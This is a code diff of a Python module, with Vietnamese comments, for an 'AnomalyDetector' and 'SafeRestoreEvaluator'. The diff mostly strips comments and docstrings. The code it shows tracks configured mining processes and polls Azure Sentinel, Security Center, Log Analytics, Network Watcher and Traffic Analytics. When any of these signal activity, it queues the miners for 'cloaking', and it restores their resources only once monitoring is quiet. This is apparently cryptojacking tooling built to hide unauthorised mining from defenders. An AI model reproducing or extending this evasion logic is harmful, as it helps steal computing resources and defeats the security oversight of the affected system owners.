@@ -21,7 +21,6 @@ from .auxiliary_modules.temperature_monitor import (
     get_gpu_temperature
 )
 
-
 class SafeRestoreEvaluator:
     """
     Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho các tiến trình.
@@ -52,9 +51,6 @@ class SafeRestoreEvaluator:
     def is_safe_to_restore(self, process: MiningProcess) -> bool:
         """
         Kiểm tra xem điều kiện có đủ an toàn để khôi phục tài nguyên cho tiến trình hay không.
-
-        Returns:
-            bool: True nếu an toàn để khôi phục, False nếu không.
         """
         try:
             # 1) Kiểm tra nhiệt độ CPU
@@ -68,7 +64,6 @@ class SafeRestoreEvaluator:
             # 2) Kiểm tra nhiệt độ GPU
             if self.resource_manager.shared_resource_manager.is_gpu_initialized():
                 gpu_temps = get_gpu_temperature(process.pid)
-                # gpu_temps phải là list float, nên dùng any(...) để so sánh
                 if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
                     self.logger.info(
                         f"Nhiệt độ GPU {gpu_temps}°C vẫn cao cho tiến trình {process.name} (PID: {process.pid})."
@@ -107,7 +102,7 @@ class SafeRestoreEvaluator:
 
             # 7) Kiểm tra sử dụng Disk I/O
             disk_io_counters = psutil.disk_io_counters()
-            # [CHANGES] Đảm bảo toán tử + và / được bao đóng trong ngoặc
+            # Đảm bảo biểu thức + / được bao trong ngoặc
             total_disk_io_usage_mbps = (
                 (disk_io_counters.read_bytes + disk_io_counters.write_bytes)
                 / (1024 * 1024)
@@ -163,7 +158,7 @@ class SafeRestoreEvaluator:
             # 12) Kiểm tra lưu lượng từ Azure Traffic Analytics
             traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
             if traffic_data:  # traffic_data thường là list hoặc dict
-                # Nếu là list, check len(); nếu là dict thì check empty
+                # Nếu là list, check len(); nếu là dict, check số key
                 if (isinstance(traffic_data, list) and len(traffic_data) > 0) \
                    or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
                     self.logger.info("Vẫn còn lưu lượng bất thường từ Azure Traffic Analytics.")
@@ -171,7 +166,6 @@ class SafeRestoreEvaluator:
 
             # 13) Kiểm tra bất thường qua Azure Anomaly Detector
             current_state = self.resource_manager.collect_metrics(process)
-            # anomalies_detected có thể là dict/ bool/ ...
             anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
             if anomalies_detected:
                 self.logger.info(
@@ -179,7 +173,7 @@ class SafeRestoreEvaluator:
                 )
                 return False
 
-            # Nếu tất cả các kiểm tra đều OK => an toàn
+            # Tất cả kiểm tra đều ổn => an toàn
             self.logger.info(
                 f"Điều kiện an toàn để khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid})."
             )
@@ -188,7 +182,6 @@ class SafeRestoreEvaluator:
         except Exception as e:
             self.logger.error(f"Xảy ra lỗi khi đánh giá khôi phục: {str(e)}")
             return False
-
 
 class AnomalyDetector(BaseManager):
     """
@@ -210,25 +203,20 @@ class AnomalyDetector(BaseManager):
             return
         self._initialized = True
 
-        # Cấu hình
         self.logger = logger
         self.config = config
 
-        # Sự kiện để dừng các luồng
         self.stop_event = Event()
 
-        # Danh sách tiến trình khai thác
         self.mining_processes: List[MiningProcess] = []
         self.mining_processes_lock = Lock()
 
-        # Khởi tạo luồng phát hiện bất thường
         self.anomaly_thread = Thread(
             target=self.anomaly_detection,
             name="AnomalyDetectionThread",
             daemon=True
         )
 
-        # Khởi tạo NVML
         try:
             pynvml.nvmlInit()
             self.gpu_initialized = True
@@ -237,10 +225,7 @@ class AnomalyDetector(BaseManager):
             self.logger.error(f"Failed to initialize NVML: {e}")
             self.gpu_initialized = False
 
-        # Trì hoãn việc import ResourceManager để tránh phụ thuộc vòng
         self.resource_manager = None
-
-        # Khởi tạo SafeRestoreEvaluator (sẽ thiết lập sau khi ResourceManager được gán)
         self.safe_restore_evaluator = None
 
     def set_resource_manager(self, resource_manager):
@@ -250,7 +235,6 @@ class AnomalyDetector(BaseManager):
         self.resource_manager = resource_manager
         self.logger.info("ResourceManager has been set for AnomalyDetector.")
 
-        # Khởi tạo SafeRestoreEvaluator
         self.safe_restore_evaluator = SafeRestoreEvaluator(
             self.config,
             self.logger,
@@ -277,9 +261,6 @@ class AnomalyDetector(BaseManager):
         self.logger.info("AnomalyDetector stopped successfully.")
 
     def discover_mining_processes(self):
-        """
-        Phát hiện các tiến trình khai thác dựa trên cấu hình từ tệp cấu hình.
-        """
         cpu_process_name = self.config['processes'].get('CPU', '').lower()
         gpu_process_name = self.config['processes'].get('GPU', '').lower()
 
@@ -297,16 +278,12 @@ class AnomalyDetector(BaseManager):
                         network_interface,
                         self.logger
                     )
-                    # Gắn cờ is_cloaked để xác định tiến trình đã cloaking chưa
                     mining_proc.is_cloaked = False
                     self.mining_processes.append(mining_proc)
 
             self.logger.info(f"Discovered {len(self.mining_processes)} mining processes.")
 
     def get_process_priority(self, process_name: str) -> int:
-        """
-        Lấy mức độ ưu tiên của tiến trình từ cấu hình.
-        """
         priority_map = self.config.get('process_priority_map', {})
         priority = priority_map.get(process_name.lower(), 1)
         # [CHANGES] Đảm bảo priority là int
@@ -318,9 +295,6 @@ class AnomalyDetector(BaseManager):
         return priority
 
     def anomaly_detection(self):
-        """
-        Luồng phát hiện bất thường và gửi yêu cầu cloaking nếu cần.
-        """
         detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 60)
         cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
         last_detection_time = 0
@@ -335,7 +309,6 @@ class AnomalyDetector(BaseManager):
             last_detection_time = current_time
 
             try:
-                # Phát hiện lại các tiến trình
                 self.discover_mining_processes()
 
                 if self.resource_manager is None:
@@ -344,12 +317,8 @@ class AnomalyDetector(BaseManager):
 
                 with self.mining_processes_lock:
                     for process in self.mining_processes:
-                        # Cập nhật tài nguyên
                         process.update_resource_usage()
-
-                        # Thu thập metric
                         current_state = self.resource_manager.collect_metrics(process)
-                        # anomalies_detected có thể là dict/ bool/ ...
                         anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
 
                         if anomalies_detected:
@@ -362,9 +331,8 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # Kiểm tra các cảnh báo từ Azure Sentinel
+                        # Kiểm tra alerts từ Azure Sentinel
                         alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=1)
-                        # [CHANGES] Kiểm tra alerts là list
                         if isinstance(alerts, list) and len(alerts) > 0:
                             self.logger.warning(
                                 f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}"
@@ -380,17 +348,15 @@ class AnomalyDetector(BaseManager):
                                 "| summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                             ).format(vm['name'])
                             logs = self.resource_manager.azure_log_analytics_client.query_logs(query)
-
-                            # [CHANGES] Kiểm tra logs
                             if isinstance(logs, list) and len(logs) > 0:
                                 self.logger.warning(
                                     f"Detected logs từ Azure Log Analytics cho VM {vm['name']}."
                                 )
                                 self.resource_manager.cloaking_request_queue.put(process)
                                 process.is_cloaked = True
-                                break  # Cloak immediately
+                                break
 
-                        # Kiểm tra khuyến nghị từ Azure Security Center
+                        # Kiểm tra recommendations từ Azure Security Center
                         recommendations = self.resource_manager.azure_security_center_client.get_security_recommendations()
                         if isinstance(recommendations, list) and len(recommendations) > 0:
                             self.logger.warning(
@@ -400,7 +366,7 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # Kiểm tra lưu lượng từ Azure Network Watcher
+                        # Kiểm tra flow logs từ Azure Network Watcher
                         for nsg in self.resource_manager.nsgs:
                             flow_logs = self.resource_manager.azure_network_watcher_client.get_flow_logs(
                                 resource_group=nsg['resourceGroup'],
@@ -411,7 +377,7 @@ class AnomalyDetector(BaseManager):
                                 ),
                                 nsg_name=nsg['name']
                             )
-                            if flow_logs:  # flow_logs thường là list/ dict
+                            if flow_logs:
                                 if (isinstance(flow_logs, list) and len(flow_logs) > 0) \
                                    or (isinstance(flow_logs, dict) and len(flow_logs.keys()) > 0):
                                     self.logger.warning(
@@ -421,9 +387,9 @@ class AnomalyDetector(BaseManager):
                                     process.is_cloaked = True
                                     break
 
-                        # Kiểm tra lưu lượng từ Azure Traffic Analytics
+                        # Kiểm tra traffic từ Azure Traffic Analytics
                         traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
-                        if traffic_data:  # traffic_data thường là list hoặc dict
+                        if traffic_data:
                             if (isinstance(traffic_data, list) and len(traffic_data) > 0) \
                                or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
                                 self.logger.warning(
@@ -444,7 +410,6 @@ class AnomalyDetector(BaseManager):
         """
         try:
             proc = psutil.Process(process.pid)
-            # [CHANGES] Đặt cặp ngoặc cho biểu thức disk_io
             disk_io = proc.io_counters()
             disk_io_limit_mbps = (
                 (disk_io.read_bytes + disk_io.write_bytes) / (1024 * 1024)
@@ -487,11 +452,8 @@ class AnomalyDetector(BaseManager):
             return {}
 
     def get_cpu_freq(self) -> Optional[float]:
-        """
-        Lấy tần số CPU hiện tại của hệ thống.
-        """
         try:
-            freq = psutil.cpu_freq().current  # MHz
+            freq = psutil.cpu_freq().current
             self.logger.debug(f"Tần số CPU hiện tại: {freq} MHz")
             return freq
         except Exception as e:
@@ -499,9 +461,6 @@ class AnomalyDetector(BaseManager):
             return None
 
     def get_cache_percent(self) -> Optional[float]:
-        """
-        Lấy phần trăm Cache hiện tại của hệ thống.
-        """
         try:
             mem = psutil.virtual_memory()
             cache_percent = mem.cached / mem.total * 100
@@ -512,9 +471,6 @@ class AnomalyDetector(BaseManager):
             return None
 
     def get_gpu_memory_percent(self, pid: Optional[int] = None) -> float:
-        """
-        Lấy phần trăm bộ nhớ GPU hiện tại. (Tính toàn bộ GPU, không riêng 1 tiến trình)
-        """
         if not self.gpu_initialized:
             self.logger.warning("GPU not initialized. Cannot get GPU memory percent.")
             return 0.0
@@ -542,9 +498,6 @@ class AnomalyDetector(BaseManager):
             return 0.0
 
     def get_gpu_temperature(self, pid: Optional[int] = None) -> float:
-        """
-        Lấy nhiệt độ GPU hiện tại (trung bình nếu có nhiều GPU).
-        """
         temps = get_gpu_temperature(pid)
         if temps:
             avg_temp = sum(temps) / len(temps)
